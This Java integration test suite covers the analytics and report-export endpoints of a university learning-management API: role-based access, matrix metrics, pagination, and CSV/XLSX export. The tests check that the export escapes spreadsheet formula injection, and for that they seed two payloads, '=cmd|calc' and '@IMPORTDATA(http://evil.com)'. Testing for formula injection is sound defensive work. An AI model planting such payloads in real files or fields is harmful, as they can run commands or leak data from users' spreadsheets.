package com.hcmute.lms.lmsapi.controller;

import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.nullValue;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.hcmute.lms.lmsapi.document.AggregateResult;
import com.hcmute.lms.lmsapi.document.CalculationRun;
import com.hcmute.lms.lmsapi.document.Clo;
import com.hcmute.lms.lmsapi.document.CloMeasurement;
import com.hcmute.lms.lmsapi.document.Course;
import com.hcmute.lms.lmsapi.document.CourseSection;
import com.hcmute.lms.lmsapi.document.Faculty;
import com.hcmute.lms.lmsapi.document.Program;
import com.hcmute.lms.lmsapi.document.ProgramVersion;
import com.hcmute.lms.lmsapi.document.Student;
import com.hcmute.lms.lmsapi.document.Syllabus;
import com.hcmute.lms.lmsapi.document.Term;
import com.hcmute.lms.lmsapi.document.User;
import com.hcmute.lms.lmsapi.document.Verification;
import com.hcmute.lms.lmsapi.enums.AggregateScopeType;
import com.hcmute.lms.lmsapi.enums.CalculationScope;
import com.hcmute.lms.lmsapi.enums.CalculationStatus;
import com.hcmute.lms.lmsapi.enums.EnrollmentStatus;
import com.hcmute.lms.lmsapi.enums.ProgramVersionStatus;
import com.hcmute.lms.lmsapi.enums.ResultLevel;
import com.hcmute.lms.lmsapi.enums.Role;
import com.hcmute.lms.lmsapi.enums.SectionStatus;
import com.hcmute.lms.lmsapi.enums.SyllabusStatus;
import com.hcmute.lms.lmsapi.enums.VerificationStatus;
import com.hcmute.lms.lmsapi.testsupport.IntegrationTestBase;
import java.io.ByteArrayInputStream;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.assertj.core.api.Assertions;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpHeaders;
import org.springframework.test.web.servlet.MvcResult;

@DisplayName("AnalyticsController Integration Tests (Milestone 1)")
class AnalyticsControllerIntegrationTest extends IntegrationTestBase {

  private Program program;
  private ProgramVersion programVersion;
  private Course course;
  private Term term;
  private Syllabus syllabus;
  private CourseSection section1;
  private CourseSection section2;
  private Clo clo1;
  private CalculationRun calculationRun;

  private String adminToken;
  private String qaToken;
  private String pmToken;
  private String otherPmToken;
  private String lecturerToken;

  private final List<String> createdRunIds = new ArrayList<>();
  private final List<String> createdAggIds = new ArrayList<>();

  @BeforeEach
  void setUpTestData() {
    // 1. Tạo thực thể mẫu dùng ApiTestFixtures
    program = fixtures.program();
    programVersion = fixtures.programVersion(program, ProgramVersionStatus.ACTIVE);
    course = fixtures.course();
    term = fixtures.term();
    syllabus = fixtures.syllabus(course, SyllabusStatus.CONFIRMED);

    // 2. Tạo lớp học phần
    section1 =
        mongo()
            .save(
                CourseSection.builder()
                    .code(fixtures.code("SEC1"))
                    .courseId(course.getId())
                    .syllabusId(syllabus.getId())
                    .termId(term.getId())
                    .lecturerIds(List.of())
                    .enrolledCount(40)
                    .status(SectionStatus.OPEN)
                    .build());

    section2 =
        mongo()
            .save(
                CourseSection.builder()
                    .code(fixtures.code("SEC2"))
                    .courseId(course.getId())
                    .syllabusId(syllabus.getId())
                    .termId(term.getId())
                    .lecturerIds(List.of())
                    .enrolledCount(35)
                    .status(SectionStatus.OPEN)
                    .build());

    // 3. Tạo CLO & PLO
    clo1 = fixtures.clo(syllabus, "CLO1");
    fixtures.clo(syllabus, "CLO2");
    fixtures.plo(programVersion, "PLO1", 1);

    // 4. Tạo CalculationRun có status SUCCESS (Source of Truth)
    calculationRun =
        mongo()
            .save(
                CalculationRun.builder()
                    .scope(CalculationScope.SECTION)
                    .lockKey(fixtures.code("LOCK"))
                    .programVersionId(programVersion.getId())
                    .status(CalculationStatus.SUCCESS)
                    .official(true)
                    .stale(false)
                    .startedAt(Instant.now())
                    .finishedAt(Instant.now())
                    .build());
    createdRunIds.add(calculationRun.getId());

    // 5. Tạo kết quả tổng hợp AggregateResult cho section1 x clo1
    AggregateResult agg1 =
        mongo()
            .save(
                AggregateResult.builder()
                    .runId(calculationRun.getId())
                    .level(ResultLevel.CLO)
                    .subjectId(clo1.getId())
                    .sectionId(section1.getId())
                    .scope(
                        AggregateResult.Scope.builder()
                            .type(AggregateScopeType.SECTION)
                            .refId(section1.getId())
                            .build())
                    .counts(
                        AggregateResult.Counts.builder().enrolled(40).passed(36).failed(4).build())
                    .mean(0.85)
                    .passRate(0.90)
                    .build());
    createdAggIds.add(agg1.getId());

    // 6. Tạo tokens cho 4 vai trò (PM phân quyền theo facultyId, LECTURER theo section.lecturerIds)
    Faculty faculty = fixtures.faculty();
    program.setFacultyId(faculty.getId());
    program = mongo().save(program);
    course.setFacultyId(faculty.getId());
    course = mongo().save(course);

    adminToken = fixtures.bearerFor(Role.ADMIN);
    qaToken = fixtures.bearerFor(Role.QA);

    User pmUser = fixtures.user(Role.PROGRAM_MANAGER);
    pmUser.setFacultyId(faculty.getId());
    pmUser = mongo().save(pmUser);
    pmToken = fixtures.bearer(pmUser);

    Faculty otherFaculty = fixtures.faculty();
    User otherPmUser = fixtures.user(Role.PROGRAM_MANAGER);
    otherPmUser.setFacultyId(otherFaculty.getId());
    otherPmUser = mongo().save(otherPmUser);
    otherPmToken = fixtures.bearer(otherPmUser);

    User lecturerUser = fixtures.user(Role.LECTURER);
    section1.setLecturerIds(List.of(lecturerUser.getId()));
    section1 = mongo().save(section1);
    lecturerToken = fixtures.bearer(lecturerUser);
  }

  @AfterEach
  void cleanCustomData() {
    for (String aggId : createdAggIds) {
      AggregateResult agg = mongo().findById(aggId, AggregateResult.class);
      if (agg != null) {
        mongo().remove(agg);
      }
    }
    for (String runId : createdRunIds) {
      CalculationRun run = mongo().findById(runId, CalculationRun.class);
      if (run != null) {
        mongo().remove(run);
      }
    }
  }

  // =========================================================================
  // PHÂN QUYỀN VAI TRÒ & SCOPE (R3)
  // =========================================================================

  @Test
  @DisplayName("ADMIN có quyền truy vấn dữ liệu phân tích đa chiều (200 OK)")
  void testAdminCanQueryAnalytics() throws Exception {
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.dimension").value("COURSE_SECTIONS"))
        .andExpect(jsonPath("$.level").value("CLO"))
        .andExpect(jsonPath("$.isOfficial").value(true))
        .andExpect(jsonPath("$.columns").isArray())
        .andExpect(jsonPath("$.rows").isArray())
        .andExpect(jsonPath("$.matrix").isArray());
  }

  @Test
  @DisplayName("QA với Strict Empty Scope có quyền đọc toàn hệ thống (200 OK)")
  void testQaStrictEmptyScopeCanQuery() throws Exception {
    mockMvc
        .perform(
            getAs(
                qaToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.dimension").value("COURSE_SECTIONS"));
  }

  @Test
  @DisplayName("PROGRAM_MANAGER trong phạm vi phụ trách được phép truy vấn (200 OK)")
  void testProgramManagerWithinScopeAllowed() throws Exception {
    mockMvc
        .perform(
            getAs(
                pmToken,
                "/api/v1/reports/analytics?dimension=COHORT&programVersionId={pvId}",
                programVersion.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.dimension").value("COHORT"));
  }

  @Test
  @DisplayName("PROGRAM_MANAGER ngoài phạm vi phụ trách bị từ chối với 403 Forbidden")
  void testProgramManagerOutOfScopeForbidden() throws Exception {
    mockMvc
        .perform(
            getAs(
                otherPmToken,
                "/api/v1/reports/analytics?dimension=COHORT&programVersionId={pvId}",
                programVersion.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("LECTURER được phép so sánh lớp mình phụ trách (200 OK)")
  void testLecturerWithinScopeAllowed() throws Exception {
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}&sectionIds={secId}",
                course.getId(),
                section1.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.dimension").value("COURSE_SECTIONS"))
        .andExpect(jsonPath("$.columns", hasSize(1)))
        .andExpect(jsonPath("$.columns[0].id").value(section1.getId()));
  }

  @Test
  @DisplayName("LECTURER truy cập lớp không phụ trách bị từ chối với 403 Forbidden")
  void testLecturerOutOfScopeSectionForbidden() throws Exception {
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}&sectionIds={sec1},{sec2}",
                course.getId(),
                section1.getId(),
                section2.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("LECTURER truy vấn chiều COHORT (cấp CTĐT) bị từ chối với 403 Forbidden")
  void testLecturerCohortDimensionForbidden() throws Exception {
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=COHORT&programVersionId={pvId}",
                programVersion.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("PROGRAM_MANAGER truy vấn TIME_TERM không có tham số bị từ chối với 403 Forbidden")
  void testProgramManagerQueryingTimeTermWithoutParametersReturnsForbidden() throws Exception {
    mockMvc
        .perform(getAs(pmToken, "/api/v1/reports/analytics?dimension=TIME_TERM"))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName(
      "PROGRAM_MANAGER truy vấn runId ngoài phạm vi phụ trách bị từ chối với 403 Forbidden")
  void testProgramManagerQueryingUnauthorizedRunIdReturnsForbidden() throws Exception {
    Program foreignProg = fixtures.program();
    ProgramVersion foreignPv = fixtures.programVersion(foreignProg, ProgramVersionStatus.ACTIVE);
    CalculationRun foreignRun =
        mongo()
            .save(
                CalculationRun.builder()
                    .scope(CalculationScope.PROGRAM)
                    .lockKey(fixtures.code("LOCK-F-PM"))
                    .programVersionId(foreignPv.getId())
                    .status(CalculationStatus.SUCCESS)
                    .official(true)
                    .build());
    createdRunIds.add(foreignRun.getId());

    mockMvc
        .perform(
            getAs(
                pmToken,
                "/api/v1/reports/analytics?dimension=COHORT&programVersionId={pvId}&runId={runId}",
                programVersion.getId(),
                foreignRun.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName(
      "LECTURER truy vấn TIME_TERM toàn hệ thống không có lớp/học phần bị từ chối với 403 Forbidden")
  void testLecturerQueryingGlobalTimeTermReturnsForbidden() throws Exception {
    mockMvc
        .perform(getAs(lecturerToken, "/api/v1/reports/analytics?dimension=TIME_TERM"))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("LECTURER truy vấn BLOOM_LEVEL không có học phần bị từ chối với 403 Forbidden")
  void testLecturerQueryingBloomLevelWithoutCourseReturnsForbidden() throws Exception {
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=CURRICULUM_CLASSIFICATION&classificationType=BLOOM_LEVEL"))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName(
      "LECTURER truy vấn ASSESSMENT_COMPONENT không có học phần bị từ chối với 403 Forbidden")
  void testLecturerQueryingAssessmentComponentWithoutCourseReturnsForbidden() throws Exception {
    mockMvc
        .perform(getAs(lecturerToken, "/api/v1/reports/analytics?dimension=ASSESSMENT_COMPONENT"))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName(
      "LECTURER truy vấn ASSESSMENT_COMPONENT với môn không phụ trách bị từ chối với 403 Forbidden")
  void testLecturerQueryingAssessmentComponentWithUnassignedCourseReturnsForbidden()
      throws Exception {
    Course unassignedCourse = fixtures.course();
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=ASSESSMENT_COMPONENT&courseId={courseId}",
                unassignedCourse.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("LECTURER truy vấn runId không phụ trách bị từ chối với 403 Forbidden")
  void testLecturerQueryingUnauthorizedRunIdReturnsForbidden() throws Exception {
    Program foreignProg = fixtures.program();
    ProgramVersion foreignPv = fixtures.programVersion(foreignProg, ProgramVersionStatus.ACTIVE);
    CalculationRun foreignRun =
        mongo()
            .save(
                CalculationRun.builder()
                    .scope(CalculationScope.PROGRAM)
                    .lockKey(fixtures.code("LOCK-F-PM"))
                    .programVersionId(foreignPv.getId())
                    .status(CalculationStatus.SUCCESS)
                    .official(true)
                    .build());
    createdRunIds.add(foreignRun.getId());

    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}&sectionIds={secId}&runId={runId}",
                course.getId(),
                section1.getId(),
                foreignRun.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("Yêu cầu chưa xác thực bị từ chối với 401 Unauthorized")
  void testUnauthenticatedAccessRejected() throws Exception {
    mockMvc
        .perform(getAs(null, "/api/v1/reports/analytics?dimension=TIME_TERM"))
        .andExpect(status().isUnauthorized());
  }

  // =========================================================================
  // CẤU TRÚC CHỈ SỐ Ô MA TRẬN & XỬ LÝ MẪU SỐ BẰNG 0 (R2)
  // =========================================================================

  @Test
  @DisplayName("Ô ma trận trả về đủ 10 trường chỉ số và xử lý null an toàn khi chưa có dữ liệu")
  void testCellMetricsPayloadAndZeroDenominatorNullSafety() throws Exception {
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        // Ô có dữ liệu: section1 x clo1
        .andExpect(jsonPath("$.matrix[0][0].enrolled").value(40))
        .andExpect(jsonPath("$.matrix[0][0].evaluated").value(40))
        .andExpect(jsonPath("$.matrix[0][0].passed").value(36))
        .andExpect(jsonPath("$.matrix[0][0].failed").value(4))
        .andExpect(jsonPath("$.matrix[0][0].insufficientData").value(0))
        .andExpect(jsonPath("$.matrix[0][0].mean").value(0.85))
        .andExpect(jsonPath("$.matrix[0][0].passRate").value(0.90))
        .andExpect(jsonPath("$.matrix[0][0].passRateOfEnrolled").value(0.90))
        .andExpect(jsonPath("$.matrix[0][0].isOfficial").value(true))
        .andExpect(jsonPath("$.matrix[0][0].isStale").value(false))
        // Ô không có dữ liệu (section2 x clo1): evaluated == 0 -> passRate = null, mean = null
        .andExpect(jsonPath("$.matrix[0][1].enrolled").value(0))
        .andExpect(jsonPath("$.matrix[0][1].evaluated").value(0))
        .andExpect(jsonPath("$.matrix[0][1].passRate").value(nullValue()))
        .andExpect(jsonPath("$.matrix[0][1].mean").value(nullValue()));
  }

  // =========================================================================
  // XUẤT CSV MA TRẬN PHÂN TÍCH (R4)
  // =========================================================================

  @Test
  @DisplayName("Xuất CSV ma trận trả về HTTP 200, Content-Type text/csv, UTF-8 BOM và dữ liệu khớp")
  void testMatrixCsvExportEndpoint() throws Exception {
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics/export?dimension=COURSE_SECTIONS&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(header().string(HttpHeaders.CONTENT_TYPE, containsString("text/csv")))
        .andExpect(header().string(HttpHeaders.CONTENT_TYPE, containsString("charset=UTF-8")))
        .andExpect(
            header()
                .string(
                    HttpHeaders.CONTENT_DISPOSITION,
                    containsString("attachment; filename=\"analytics-matrix-course_sections-")))
        .andExpect(content().string(containsString("BÁO CÁO PHÂN TÍCH ĐA CHIỀU")))
        .andExpect(content().string(containsString("CLO1")))
        .andExpect(content().string(containsString("90.00%")));
  }

  @Test
  @DisplayName("Xuất CSV vô hiệu hóa tấn công chèn công thức CSV (CWE-1236)")
  void testMatrixCsvExportEscapesFormulaCharacters() throws Exception {
    Clo formulaClo1 =
        mongo()
            .save(
                Clo.builder()
                    .syllabusId(syllabus.getId())
                    .courseId(course.getId())
                    .code("CLO98")
                    .contentOriginal("=cmd|calc")
                    .bloomLevel(1)
                    .measurement(CloMeasurement.builder().defaultPassThreshold(0.5).build())
                    .verification(
                        Verification.builder().status(VerificationStatus.UNVERIFIED).build())
                    .build());
    Clo formulaClo2 =
        mongo()
            .save(
                Clo.builder()
                    .syllabusId(syllabus.getId())
                    .courseId(course.getId())
                    .code("CLO99")
                    .contentOriginal("@IMPORTDATA(http://evil.com)")
                    .bloomLevel(1)
                    .measurement(CloMeasurement.builder().defaultPassThreshold(0.5).build())
                    .verification(
                        Verification.builder().status(VerificationStatus.UNVERIFIED).build())
                    .build());

    try {
      mockMvc
          .perform(
              getAs(
                  adminToken,
                  "/api/v1/reports/analytics/export?dimension=COURSE_SECTIONS&courseId={courseId}",
                  course.getId()))
          .andExpect(status().isOk())
          .andExpect(content().string(containsString("'=cmd|calc")))
          .andExpect(content().string(containsString("'@IMPORTDATA")));
    } finally {
      mongo().remove(formulaClo1);
      mongo().remove(formulaClo2);
    }
  }

  @Test
  @DisplayName("D6: Truy vấn ma trận COURSE_LECTURER thành công (200 OK)")
  void testQueryCourseLecturerAnalytics() throws Exception {
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=COURSE_LECTURER&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.dimension").value("COURSE_LECTURER"))
        .andExpect(jsonPath("$.level").value("CLO"))
        .andExpect(jsonPath("$.columns").isArray())
        .andExpect(jsonPath("$.rows").isArray())
        .andExpect(jsonPath("$.matrix").isArray());
  }

  @Test
  @DisplayName("D6: LECTURER truy vấn giảng viên khác ở chiều COURSE_LECTURER bị 403 Forbidden")
  void testLecturerQueryOtherLecturerCourseLecturerForbidden() throws Exception {
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=COURSE_LECTURER&courseId={courseId}&lecturerId={otherLecId}",
                course.getId(),
                "other_lecturer_id"))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName(
      "D7: Truy vấn ma trận STUDENT thành công, hỗ trợ phân trang cột và search; export giữ nguyên toàn bộ")
  void testQueryStudentAnalytics() throws Exception {
    Student s1 = fixtures.student();
    Student s2 = fixtures.student();
    fixtures.enrollment(section1, s1, EnrollmentStatus.ENROLLED);
    fixtures.enrollment(section1, s2, EnrollmentStatus.ENROLLED);
    List<String> sortedCodes =
        List.of(s1.getStudentCode(), s2.getStudentCode()).stream().sorted().toList();

    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=STUDENT&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.dimension").value("STUDENT"))
        .andExpect(jsonPath("$.level").value("CLO"))
        .andExpect(jsonPath("$.columns", hasSize(2)))
        .andExpect(jsonPath("$.totalElements").value(2))
        .andExpect(jsonPath("$.totalPages").value(1))
        .andExpect(jsonPath("$.last").value(true))
        .andExpect(jsonPath("$.rows", hasSize(2)))
        .andExpect(jsonPath("$.matrix").isArray());

    // Phân trang cột sinh viên size=1 -> page=0 và page=1 mỗi trang chỉ chứa 1 cột sinh viên
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=STUDENT&courseId={courseId}&page=0&size=1",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.columns", hasSize(1)))
        .andExpect(jsonPath("$.columns[0].code").value(sortedCodes.get(0)))
        .andExpect(jsonPath("$.matrix[0]", hasSize(1)))
        .andExpect(jsonPath("$.page").value(0))
        .andExpect(jsonPath("$.size").value(1))
        .andExpect(jsonPath("$.totalElements").value(2))
        .andExpect(jsonPath("$.totalPages").value(2))
        .andExpect(jsonPath("$.last").value(false));

    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=STUDENT&courseId={courseId}&page=1&size=1",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.columns", hasSize(1)))
        .andExpect(jsonPath("$.columns[0].code").value(sortedCodes.get(1)))
        .andExpect(jsonPath("$.last").value(true));

    // Tìm theo MSSV
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=STUDENT&courseId={courseId}&search={q}",
                course.getId(),
                s2.getStudentCode()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.columns", hasSize(1)))
        .andExpect(jsonPath("$.columns[0].code").value(s2.getStudentCode()))
        .andExpect(jsonPath("$.totalElements").value(1));

    // page/size sai biên cho STUDENT -> 400
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=STUDENT&courseId={courseId}&page=-1",
                course.getId()))
        .andExpect(status().isBadRequest());
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=STUDENT&courseId={courseId}&size=101",
                course.getId()))
        .andExpect(status().isBadRequest());

    // Export CSV dù truyền page=0&size=1 vẫn xuất đủ cả 2 sinh viên
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics/export?dimension=STUDENT&courseId={courseId}&page=0&size=1",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(content().string(containsString(s1.getStudentCode())))
        .andExpect(content().string(containsString(s2.getStudentCode())));
  }

  @Test
  @DisplayName("Xuất CSV cho chiều COURSE_LECTURER và STUDENT thành công")
  void testExportCsvNewDimensions() throws Exception {
    // 1. Export COURSE_LECTURER
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics/export?dimension=COURSE_LECTURER&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(header().string(HttpHeaders.CONTENT_TYPE, containsString("text/csv")))
        .andExpect(
            header()
                .string(
                    HttpHeaders.CONTENT_DISPOSITION,
                    containsString("attachment; filename=\"analytics-matrix-course_lecturer-")))
        .andExpect(content().string(containsString("COURSE_LECTURER")));

    // 2. Export STUDENT
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics/export?dimension=STUDENT&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(header().string(HttpHeaders.CONTENT_TYPE, containsString("text/csv")))
        .andExpect(
            header()
                .string(
                    HttpHeaders.CONTENT_DISPOSITION,
                    containsString("attachment; filename=\"analytics-matrix-student-")))
        .andExpect(content().string(containsString("STUDENT")));
  }

  @Test
  @DisplayName(
      "Xuất Excel .xlsx ma trận phân tích trả về 2 sheet chuẩn, giữ null mẫu số 0 và chặn injection")
  void testMatrixXlsxExportEndpoint() throws Exception {
    Clo formulaClo =
        mongo()
            .save(
                Clo.builder()
                    .syllabusId(syllabus.getId())
                    .courseId(course.getId())
                    .code("CLO97")
                    .contentOriginal("=cmd|calc")
                    .bloomLevel(1)
                    .measurement(CloMeasurement.builder().defaultPassThreshold(0.5).build())
                    .verification(
                        Verification.builder().status(VerificationStatus.UNVERIFIED).build())
                    .build());
    try {
      MvcResult res =
          mockMvc
              .perform(
                  getAs(
                      adminToken,
                      "/api/v1/reports/analytics/export?dimension=COURSE_SECTIONS&courseId={courseId}&format=xlsx",
                      course.getId()))
              .andExpect(status().isOk())
              .andExpect(
                  header()
                      .string(
                          HttpHeaders.CONTENT_TYPE,
                          containsString(
                              "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")))
              .andExpect(
                  header()
                      .string(
                          HttpHeaders.CONTENT_DISPOSITION,
                          containsString(
                              "attachment; filename=\"analytics-matrix-course_sections-")))
              .andExpect(
                  header().string(HttpHeaders.CONTENT_DISPOSITION, containsString(".xlsx\"")))
              .andReturn();

      try (Workbook wb =
          new XSSFWorkbook(new ByteArrayInputStream(res.getResponse().getContentAsByteArray()))) {
        Sheet matrixSheet = wb.getSheet("MaTranPhanTich");
        Sheet detailSheet = wb.getSheet("DuLieuChiTiet");
        Assertions.assertThat(matrixSheet).isNotNull();
        Assertions.assertThat(detailSheet).isNotNull();

        Row clo1PassRow = findRow(matrixSheet, 0, "CLO1", 2, "Tỷ lệ đạt (Evaluated)");
        Assertions.assertThat(clo1PassRow).isNotNull();
        Assertions.assertThat(clo1PassRow.getCell(3).getNumericCellValue()).isEqualTo(0.90);
        // section2 chưa có dữ liệu -> ô rỗng, không ép thành 0.0
        Assertions.assertThat(clo1PassRow.getCell(4)).isNull();

        Row formulaRow = findRow(matrixSheet, 0, "CLO97", 2, "Tỷ lệ đạt (Evaluated)");
        Assertions.assertThat(formulaRow).isNotNull();
        Assertions.assertThat(formulaRow.getCell(1).getCellType()).isEqualTo(CellType.STRING);
        Assertions.assertThat(formulaRow.getCell(1).getStringCellValue()).isEqualTo("'=cmd|calc");
      }
    } finally {
      mongo().remove(formulaClo);
    }
  }

  @Test
  @DisplayName(
      "Xuất Excel .xlsx cho STUDENT bỏ qua phân trang, từ chối format=pdf (400) và chặn LECTURER ngoài phạm vi (403)")
  void testMatrixXlsxStudentValidationAndAuthorization() throws Exception {
    Student s1 = fixtures.student();
    Student s2 = fixtures.student();
    fixtures.enrollment(section1, s1, EnrollmentStatus.ENROLLED);
    fixtures.enrollment(section1, s2, EnrollmentStatus.ENROLLED);

    MvcResult stuRes =
        mockMvc
            .perform(
                getAs(
                    adminToken,
                    "/api/v1/reports/analytics/export?dimension=STUDENT&courseId={courseId}&page=0&size=1&format=xlsx",
                    course.getId()))
            .andExpect(status().isOk())
            .andReturn();
    try (Workbook wb =
        new XSSFWorkbook(new ByteArrayInputStream(stuRes.getResponse().getContentAsByteArray()))) {
      Sheet detailSheet = wb.getSheet("DuLieuChiTiet");
      Assertions.assertThat(findRow(detailSheet, 0, "CLO1", 1, s1.getStudentCode())).isNotNull();
      Assertions.assertThat(findRow(detailSheet, 0, "CLO1", 1, s2.getStudentCode())).isNotNull();
    }

    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics/export?dimension=COURSE_SECTIONS&courseId={courseId}&format=pdf",
                course.getId()))
        .andExpect(status().isBadRequest());

    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics/export?dimension=COURSE_SECTIONS&courseId={courseId}&sectionIds={sec1},{sec2}&format=xlsx",
                course.getId(),
                section1.getId(),
                section2.getId()))
        .andExpect(status().isForbidden());
  }

  private static Row findRow(Sheet sheet, int colA, String valA, int colB, String valB) {
    for (Row row : sheet) {
      if (valA.equals(stringCell(row, colA)) && valB.equals(stringCell(row, colB))) {
        return row;
      }
    }
    return null;
  }

  private static String stringCell(Row row, int col) {
    Cell cell = row.getCell(col);
    return cell != null && cell.getCellType() == CellType.STRING ? cell.getStringCellValue() : null;
  }
}
